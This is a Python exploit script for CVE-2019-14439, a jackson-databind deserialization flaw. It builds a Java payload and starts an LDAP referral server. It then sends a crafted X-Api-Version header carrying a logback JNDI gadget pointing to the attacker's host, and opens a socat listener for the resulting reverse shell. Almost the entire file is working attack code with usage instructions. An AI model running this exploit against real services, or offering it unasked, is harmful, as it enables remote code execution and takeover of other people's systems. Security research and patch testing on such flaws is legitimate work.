#!/usr/bin/env python3
#  -*- coding: utf-8 -*- #######################################################################################
#  ╦┌─┐┌─┐┬┌─┌─┐┌─┐┌┐┌╦═╗╔═╗╔═╗                                                                                #
#  ║├─┤│  ├┴┐└─┐│ ││││╠╦╝║  ║╣                                                                                 #
# ╚╝┴ ┴└─┘┴ ┴└─┘└─┘┘└┘╩╚═╚═╝╚═╝                                                                                #
#                                                                                                              #
# jackson-databind-rce.py - nighter@nighter.se                                                       #
#                                                                                                              #
# DATE                                                                                                         #
# 10/03/2022                                                                                                   #
#                                                                                                              #
# DESCRIPTION                                                                                                  #
#                                                                                                              #
# CVE-2019-14439 - A Polymorphic Typing issue was discovered in FasterXML jackson-databind 2.x before 2.9.9.2. #
# This occurs when Default Typing is enabled (either globally or for a specific property) for an               #
# externally exposed JSON endpoint and the service has the logback jar in the classpath.                       #
#                                                                                                              #
################################################################################################################

import signal
import termios
import select
import socket
import os
import fcntl
import sys
import time

from multiprocessing import Process
from shutil import copyfile
import requests

# Handler to exist cleanly on ctrl+C
def signal_handler(signal, frame):
    print("\nYou pressed Ctrl+C!")
    sys.exit()
signal.signal(signal.SIGINT, signal_handler)

def prepare_payload():

    _workdir = sys.path[0]

    if os.path.isfile('src/main/java/ExportObject.java') is False:
        print("ERROR missing src/main/java/ExportObject.java")
        sys.exit(1)

    if os.path.isfile('target/ldaprefserver.jar') is False:
        print("ERROR missing ldaprefserver.jar")
        sys.exit(1)

    # Ugly but this was the easiest way I could find
    # so why not keep it simple this just works.
    print("[+] Preparing payload")
    copyfile('src/main/java/ExportObject.java', 'target/ExportObject.java')
    os.system("sed -ri 's/([0-9]{1,3}\.){3}[0-9]{1,3}/%s/' target/ExportObject.java" % LHOST)
    os.system("sed -ri 's/[0-9]{4}/%s/' target/ExportObject.java" % LPORT)
    os.chdir('target')
    os.system("javac -source 8 -target 8 ExportObject.java")
    os.system("jar uf ldaprefserver.jar ExportObject.class")


def start_ldaprefserver():
    os.system("java -jar ./ldaprefserver.jar %s" % LHOST)
   

def exploit():

    time.sleep(5)
    #print "[+] Exploit"
    headers = {"X-Api-Version": "[\"ch.qos.logback.core.db.JNDIConnectionSource\",{\"jndiLocation\":\"ldap://%s:1389/ExportObject\"}]" % LHOST}
    requests.get(URL, headers=headers)    
    print('') 


# noinspection PyInterpreter
if __name__ == '__main__':

    if len(sys.argv) != 4:
        print ("""
 ╦┌─┐┌─┐┬┌─┌─┐┌─┐┌┐┌╦═╗╔═╗╔═╗  
 ║├─┤│  ├┴┐└─┐│ ││││╠╦╝║  ║╣   
╚╝┴ ┴└─┘┴ ┴└─┘└─┘┘└┘╩╚═╚═╝╚═╝            
[nighter@nighter.se]
    """)
        print("Usage: %s <URL> <LHOST> <LPORT>" % (sys.argv[0]))
        print("EXAMPLE: ./jackson-databind-rce.py 'http://127.0.0.1:8000' 192.168.1.75 7777\n")
        sys.exit(0)

    URL = sys.argv[1]
    LHOST = sys.argv[2]
    LPORT = sys.argv[3]

    print("[+] LHOST: %s" % LHOST)

    prepare_payload()

    # Run ldap server async
    p = Process(target=start_ldaprefserver)
    p.start()

    # Run ldap server async
    p = Process(target=exploit)
    p.start()

    # Start listener
    print("[+] Shell listen")
    os.system('socat file:`tty`,raw,echo=0 tcp-listen:%s' % str(LPORT))